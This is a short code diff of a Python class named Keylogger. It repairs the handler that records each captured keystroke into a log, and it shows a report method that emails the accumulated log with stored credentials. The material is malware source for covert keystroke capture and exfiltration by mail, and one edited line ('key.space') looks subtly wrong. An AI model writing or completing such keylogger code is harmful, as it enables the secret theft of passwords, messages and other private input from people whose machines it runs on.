@@ -18,11 +18,11 @@ class Keylogger:
 		try:
 			to_append = str(key.char)
 		except AttributeError:
-			if key == Key.space:
+			if key == key.space:
 				to_append = ' '
 			else:
 				to_append = '#' + str(key) + '#'
-		append_to_log(self.to_append)
+		self.append_to_log(to_append)
 
 	def report(self):
 		self.send_mail(self.email,self.password,self.log)
